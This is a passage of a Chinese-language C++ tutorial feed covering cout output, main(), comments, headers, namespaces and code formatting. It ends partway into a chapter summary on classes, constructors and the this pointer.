<code>std::string</code> 对象。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 包含 string 类</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">65.5</span>;</span><br><span class="line">    <span class="keyword">char</span> initial = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name = <span class="string">&quot;Alice&quot;</span>; <span class="comment">// C++ string 对象</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* city = <span class="string">&quot;New York&quot;</span>; <span class="comment">// C 风格字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// cout 可以自动处理不同类型</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Personal Information ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出整数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span>; <span class="comment">// 输出提示信息</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; age;     <span class="comment">// 输出 age 变量的值 (整数)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 换行</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出浮点数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight: &quot;</span> &lt;&lt; weight &lt;&lt; <span class="string">&quot; kg&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 链式输出</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial: &quot;</span> &lt;&lt; initial &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出 C++ string 对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出 C 风格字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;City: &quot;</span> &lt;&lt; city &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 混合输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old and lives in &quot;</span> &lt;&lt; city &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出表达式结果</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next year, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; will be &quot;</span> &lt;&lt; age + <span class="number">1</span> &lt;&lt; <span class="string">&quot; years old.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cout</code> 之所以能做到这一点，是因为 <code>&lt;&lt;</code> 运算符针对不同的数据类型进行了**重载 (Overloading)**（我们将在后续章节详细学习）。简单来说，就是为 <code>&lt;&lt;</code> 运算符定义了多个版本，每个版本知道如何处理特定类型的数据，并将它们转换为适合输出的字符序列。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.1 进入C++</title>
      <link href="2025/04/26/2.1_%E8%BF%9B%E5%85%A5C++/"/>
      <url>2025/04/26/2.1_%E8%BF%9B%E5%85%A5C++/</url>
      
        <content type="html"><![CDATA[<p>本节将引导你编写第一个C++程序，并介绍一些基本概念。</p><h2 id="2-1-1-main-函数"><a href="#2-1-1-main-函数" class="headerlink" title="2.1.1 main()函数"></a>2.1.1 main()函数</h2><p>每个C++程序都必须包含一个名为 <code>main</code> 的函数。操作系统通过调用 <code>main</code> 函数来启动C++程序。<code>main</code> 函数是程序的入口点。</p><p><strong>基本结构:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 程序代码</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 表示程序成功执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>int main()</code>: 这是 <code>main</code> 函数的函数头。<code>int</code> 表示 <code>main</code> 函数执行完毕后将返回一个整数值给操作系统。括号 <code>()</code> 表示这是一个函数。</li><li>  <code>&#123; ... &#125;</code>: 花括号标记了函数体的开始和结束。函数体包含了程序要执行的指令（语句）。</li><li>  <code>return 0;</code>: 这条语句表示 <code>main</code> 函数执行完毕。返回值 <code>0</code> 通常表示程序成功执行。非零返回值通常表示程序遇到了错误。</li></ul><p><strong>示例:</strong></p><p>一个最简单的C++程序：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序什么也不做，但它是一个完整的、可以编译和运行的C++程序。</p><h2 id="2-1-2-C-注释"><a href="#2-1-2-C-注释" class="headerlink" title="2.1.2 C++注释"></a>2.1.2 C++注释</h2><p>注释是程序中用于解释代码的部分，它们会被编译器忽略，不会影响程序的执行。注释可以提高代码的可读性。</p><p>C++支持两种类型的注释：</p><ol><li> <strong>单行注释:</strong> 以 <code>//</code> 开始，直到该行结束。</li><li> <strong>多行注释:</strong> 以 <code>/*</code> 开始，以 <code>*/</code> 结束，可以跨越多行。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // 这是一个单行注释，解释包含头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   这是一个多行注释。</span></span><br><span class="line"><span class="comment">   它可以用来写更长的解释。</span></span><br><span class="line"><span class="comment">   下面的 main 函数是程序的入口点。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 使用 cout 输出 &quot;Hello, World!&quot; 到控制台</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello, World!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// endl 用于换行</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 程序成功结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-1-3-C-预处理器和iostream文件"><a href="#2-1-3-C-预处理器和iostream文件" class="headerlink" title="2.1.3 C++预处理器和iostream文件"></a>2.1.3 C++预处理器和iostream文件</h2><p>在编译C++程序之前，<strong>预处理器</strong>会首先处理源代码。预处理器指令以 <code>#</code> 符号开头。</p><p><code>#include</code> 是一个常见的预处理器指令，它告诉预处理器将另一个文件的内容包含到当前文件中。</p><p><code>iostream</code> 文件是C++标准库的一部分，包含了进行输入（input）和输出（output）操作所需的信息。例如，要使用 <code>cout</code> 进行输出，就需要包含 <code>iostream</code> 文件。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // 包含 iostream 文件，以便使用 cout</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from iostream!&quot;</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>#include &lt;iostream&gt;</code>: 这条指令告诉预处理器查找名为 <code>iostream</code> 的标准头文件，并将其内容插入到该指令所在的位置。</li></ul><h2 id="2-1-4-头文件名"><a href="#2-1-4-头文件名" class="headerlink" title="2.1.4 头文件名"></a>2.1.4 头文件名</h2><p>头文件（Header Files）包含了函数、类、对象等的声明，使得我们可以在程序中使用它们。C++标准库提供了许多头文件。</p><ul><li>  <strong>标准库头文件:</strong> 通常使用尖括号 <code>&lt;&gt;</code> 括起来，例如 <code>&lt;iostream&gt;</code>, <code>&lt;cmath&gt;</code>, <code>&lt;string&gt;</code>。编译器会在标准库的包含路径中查找这些文件。</li><li>  <strong>用户自定义头文件:</strong> 通常使用双引号 <code>&quot;&quot;</code> 括起来，例如 <code>&quot;myheader.h&quot;</code>。编译器会首先在当前源文件所在的目录查找，然后在标准包含路径中查找。</li></ul><p><strong>C++98之前的头文件:</strong> 以前的C++头文件可能带有 <code>.h</code> 后缀（如 <code>&lt;iostream.h&gt;</code>）。现代C++（C++98及以后）推荐使用不带 <code>.h</code> 后缀的标准头文件（如 <code>&lt;iostream&gt;</code>），这些头文件的内容位于 <code>std</code> 命名空间中。</p><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // 标准库头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;    // 包含数学函数，如 sqrt()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;myutils.h&quot;</span> <span class="comment">// 用户自定义头文件 (假设存在 myutils.h)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> num = <span class="number">9.0</span>;</span><br><span class="line">    <span class="keyword">double</span> root = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(num); <span class="comment">// 使用 cmath 中的 sqrt 函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Square root of &quot;</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; root &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 假设 myutils.h 中定义了 printMessage() 函数</span></span><br><span class="line">    <span class="comment">// printMessage(&quot;Using custom header!&quot;); </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-1-5-名称空间"><a href="#2-1-5-名称空间" class="headerlink" title="2.1.5 名称空间"></a>2.1.5 名称空间</h2><p>名称空间（Namespace）是C++中避免命名冲突的一种机制。不同的名称空间可以包含同名的函数、类或变量。</p><p>标准C++库中的所有内容（如 <code>cout</code>, <code>cin</code>, <code>endl</code>, <code>string</code> 等）都定义在名为 <code>std</code> 的名称空间中。</p><p>要使用 <code>std</code> 名称空间中的元素，有几种方法：</p><ol><li><strong>使用作用域解析运算符 <code>::</code>:</strong> 在每个元素前加上 <code>std::</code>。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>using</code> 声明:</strong> 将特定的名称引入当前作用域。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>; <span class="comment">// 只引入 cout</span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 只引入 endl</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello!&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 不需要 std:: 前缀</span></span><br><span class="line">    <span class="comment">// std::cin &gt;&gt; variable; // 如果要用 cin，仍需 std:: 或 using std::cin;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>using</code> 编译指令:</strong> 将整个名称空间的所有名称引入当前作用域。<strong>（不推荐在头文件中或全局作用域中使用，可能导致命名冲突）</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; <span class="comment">// 引入 std 中的所有名称</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello!&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 不需要 std:: 前缀</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x; <span class="comment">// cin 也不需要 std:: 前缀</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>推荐做法:</strong></p><ul><li>  在 <code>.cpp</code> 文件的函数内部或较小作用域内，可以使用 <code>using</code> 声明或 <code>using namespace std;</code>。</li><li>  在头文件 (<code>.h</code>) 中，<strong>绝对不要</strong>使用 <code>using namespace std;</code>，应始终使用 <code>std::</code> 前缀。</li><li>  在简单的示例或小型项目中，<code>using namespace std;</code> 可以简化代码，但在大型项目中，坚持使用 <code>std::::</code> 或 <code>using</code> 声明是更安全的做法。</li></ul><h2 id="2-1-6-使用cout进行C-输出"><a href="#2-1-6-使用cout进行C-输出" class="headerlink" title="2.1.6 使用cout进行C++输出"></a>2.1.6 使用cout进行C++输出</h2><p><code>cout</code> 是 <code>iostream</code> 库中预定义的一个对象，代表标准输出流，通常连接到控制台（屏幕）。</p><p><code>&lt;&lt;</code> 运算符（插入运算符）用于将数据发送给 <code>cout</code> 对象，使其显示在屏幕上。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 输出字符串字面量</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Welcome to C++!&quot;</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输出换行符 (使用 std::endl)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输出数字</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The year is &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="number">2024</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 链式输出</span></span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">30</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My age is: &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出特殊字符 (使用转义序列)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a tab:\t.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a newline:\n.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a quote: \&quot; &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a backslash: \\&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>std::endl</code>: 是一个特殊的控制符（manipulator），它会输出一个换行符，并<strong>刷新输出缓冲区</strong>（确保内容立即显示）。</li><li>  <code>\n</code>: 是一个转义字符，代表换行符。它只输出换行，通常不保证立即刷新缓冲区。在多数情况下，<code>\n</code> 比 <code>std::endl</code> 效率稍高。</li></ul><h2 id="2-1-7-C-源代码的格式化"><a href="#2-1-7-C-源代码的格式化" class="headerlink" title="2.1.7 C++源代码的格式化"></a>2.1.7 C++源代码的格式化</h2><p>C++语言对代码格式（如空格、缩进、换行）的要求相对宽松，但良好的格式化对于代码的可读性和可维护性至关重要。</p><p><strong>基本规则和建议:</strong></p><ul><li>  <strong>语句分隔:</strong> C++使用分号 <code>;</code> 来结束大多数语句。</li><li><strong>空格:</strong><ul><li>  通常在运算符（<code>=</code>, <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>==</code> 等）两边添加空格。</li><li>  在逗号 <code>,</code> 后面添加空格。</li><li>  在函数名和后面的括号 <code>()</code> 之间通常不加空格。</li></ul></li><li>  <strong>缩进:</strong> 使用一致的缩进（通常是4个空格或一个制表符）来表示代码块（如 <code>main</code> 函数体、循环体、条件语句体）。这极大地提高了代码结构的可读性。</li><li><strong>换行:</strong><ul><li>  通常每行只写一条语句。</li><li>  可以在合适的地方（如运算符之后、逗号之后）将长语句分成多行。</li></ul></li><li>  <strong>花括号 <code>&#123;&#125;</code>:</strong> 对于代码块（如函数体、<code>if</code> 语句块等），花括号的放置风格有多种（如 K&amp;R 风格、Allman 风格），选择一种并保持一致即可。</li></ul><p><strong>示例 (良好格式):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 左花括号通常独占一行或在行尾</span></span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial score: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (score &gt; <span class="number">90</span>) </span><br><span class="line">    &#123; <span class="comment">// 缩进表示 if 块内部</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Excellent!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        score = score + <span class="number">5</span>; <span class="comment">// 在运算符两边加空格</span></span><br><span class="line">    &#125; <span class="comment">// 右花括号通常独占一行，与对应块的起始对齐</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final score: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例 (不良格式，但语法正确):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;<span class="keyword">int</span> score=<span class="number">100</span>;<span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Initial score: &quot;</span>&lt;&lt;score&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;<span class="keyword">if</span>(score&gt;<span class="number">90</span>)&#123;<span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Excellent!&quot;</span>&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;score=score+<span class="number">5</span>;&#125;<span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Final score: &quot;</span>&lt;&lt;score&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><p>虽然第二个示例也能编译运行，但极难阅读和理解。遵循一致的、清晰的格式化风格是专业编程的重要组成部分。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.8 总结</title>
      <link href="2025/04/26/10.8_%E6%80%BB%E7%BB%93/"/>
      <url>2025/04/26/10.8_%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本章介绍了面向对象编程（OOP）的核心概念，并深入探讨了 C++ 实现 OOP 的主要机制——**类 (Class)**。类是用户定义类型的基础，它允许我们将数据和操作数据的函数封装在一起。</p><p>主要内容回顾：</p><ol><li><p> <strong>过程性编程 vs. 面向对象编程:</strong> 过程性编程关注执行步骤和函数，而面向对象编程关注数据及其相关操作，将它们封装在<strong>对象 (Object)</strong> 中。OOP 的核心思想包括封装、抽象、继承和多态。</p></li><li><p><strong>抽象和类:</strong></p><ul><li>  <strong>抽象</strong>是关注本质特征、忽略实现细节的过程。</li><li>  <strong>类</strong>是创建对象的蓝图，定义了对象的<strong>数据成员（属性）</strong>和<strong>成员函数（方法）</strong>。</li><li>  <strong>访问说明符</strong>（<code>public</code>, <code>private</code>, <code>protected</code>）控制对类成员的访问。<code>public</code> 成员构成类的<strong>公共接口</strong>，而 <code>private</code> 成员（通常是数据）实现了<strong>数据隐藏</strong>，是<strong>封装</strong>的关键。</li><li>  类的成员函数通常在类定义中声明，在单独的源文件中使用<strong>作用域解析运算符 <code>::</code></strong> 定义。</li><li>  通过类的对象使用**点号 <code>.</code>**（或指针使用箭头 <code>-&gt;</code>）访问其公有成员。</li></ul></li><li><p><strong>构造函数和析构函数:</strong></p><ul><li>  <strong>构造函数</strong>是与类同名的特殊成员函数，在创建对象时自动调用，用于初始化对象。它可以被重载。如果用户未定义任何构造函数，编译器会生成一个默认构造函数（无参）。如果用户定义了任何构造函数，编译器就不再生成默认构造函数。</li><li>  <strong>析构函数</strong>是类名前加 <code>~</code> 的特殊成员函数，在对象生命周期结束时自动调用，用于执行清理工作（如释放 <code>new</code> 分配的内存）。它没有参数，不能重载。</li></ul></li><li><p><strong><code>this</code> 指针:</strong></p><ul><li>  每个非静态成员函数都有一个隐含的 <code>this</code> 指针，指向调用该函数的对象。</li><li>  通常隐式使用，但在需要区分同名参数和成员、或需要返回对象自身引用/指针（如链式调用）时显式使用 <code>this</code> 或 <code>*this</code>。</li></ul></li><li><p><strong>对象数组:</strong></p><ul><li>  可以创建类对象的数组。</li><li>  创建数组时，会为每个元素调用构造函数（通常是默认构造函数，除非使用初始化列表）。</li><li>  访问方式为 <code>arrayName[index].member</code>。</li><li>  动态对象数组使用 <code>new ClassName[size]</code> 